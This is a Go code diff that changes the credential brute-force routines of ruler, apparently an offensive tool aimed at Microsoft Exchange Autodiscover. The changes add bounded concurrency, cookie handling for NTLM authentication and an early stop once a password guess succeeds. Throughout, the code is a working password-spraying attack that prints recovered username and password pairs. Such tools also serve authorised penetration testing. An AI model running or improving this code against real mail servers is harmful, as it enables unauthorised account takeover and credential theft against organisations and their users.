@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/http/cookiejar"
 	"regexp"
 	"strings"
 	"time"
@@ -11,6 +12,7 @@ import (
 	"github.com/sensepost/ruler/http-ntlm"
 )
 
+//Result struct holds the result of a bruteforce attempt
 type Result struct {
 	Username string
 	Password string
@@ -99,7 +101,7 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 			attempts++
 		}
 		sem := make(chan bool, concurrency)
-
+		stop := make(chan bool, concurrency)
 		for ui, u := range usernames {
 			if u == "" || p == "" {
 				continue
@@ -122,12 +124,22 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 					fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", out.Username, out.Password)
 					//remove username from username list (we don't need to brute something we know)
 					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
+					if stopSuccess == true {
+						stop <- true
+					}
 				}
-				if stopSuccess == true && out.Status == 200 {
-					//stop <- true
-					return
-				}
+
 			}(u, p, ui)
+			for i := 0; i < cap(stop); i++ {
+				select {
+				case s := <-stop:
+					if s == true {
+						return
+					}
+				default:
+					continue
+				}
+			}
 		}
 		for i := 0; i < cap(sem); i++ {
 			sem <- true
@@ -141,6 +153,7 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 	}
 }
 
+//UserPassBruteForce function does a bruteforce using a supplied user:pass file
 func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
 	fmt.Println("[*] Trying to Autodiscover domain")
 	autodiscoverURL := autodiscoverDomain(domain)
@@ -153,9 +166,9 @@ func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSucces
 		return
 	}
 
-	result := make(chan Result)
 	count := 0
-
+	sem := make(chan bool, concurrency)
+	stop := make(chan bool, concurrency)
 	for _, up := range userpass {
 		count++
 		if up == "" {
@@ -175,26 +188,37 @@ func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSucces
 			continue
 		}
 
-		go func(u string, p string) {
-			out := connect(autodiscoverURL, u, p, basic, insecure)
-			result <- out
-		}(u, p)
+		sem <- true
 
-		select {
-		case res := <-result:
-			if verbose == true && res.Status != 200 {
-				fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
-				if res.Error != nil {
-					fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
+		go func(u string, p string) {
+			defer func() { <-sem }()
+			out := connect(autodiscoverURL, u, p, basic, insecure)
+			if verbose == true && out.Status != 200 {
+				fmt.Printf("[x] Failed: %s:%s\n", out.Username, out.Password)
+				if out.Error != nil {
+					fmt.Printf("[x] An error occured in connection - %s\n", out.Error)
 				}
 			}
-			if res.Status == 200 {
-				fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
+			if out.Status == 200 {
+				fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", out.Username, out.Password)
 			}
-			if stopSuccess == true && res.Status == 200 {
-				return
+			if out.Status == 200 && stopSuccess == true {
+				stop <- true
+			}
+		}(u, p)
+		for i := 0; i < cap(stop); i++ {
+			select {
+			case s := <-stop:
+				if s == true {
+					return
+				}
+			default:
+				continue
 			}
 		}
+	}
+	for i := 0; i < cap(sem); i++ {
+		sem <- true
 	}
 }
 
@@ -215,17 +239,18 @@ func readFile(filename string) []string {
 
 func connect(autodiscoverURL, user, password string, basic, insecure bool) Result {
 	result := Result{user, password, -1, -1, nil}
-
+	cookie, _ := cookiejar.New(nil)
 	client := http.Client{}
 	if basic == false {
 		//check if this is a first request or a redirect
 		//create an ntml http client
 		client = http.Client{
 			Transport: &httpntlm.NtlmTransport{
-				Domain:   "",
-				User:     user,
-				Password: password,
-				Insecure: insecure,
+				Domain:    "",
+				User:      user,
+				Password:  password,
+				Insecure:  insecure,
+				CookieJar: cookie,
 			},
 		}
 	}
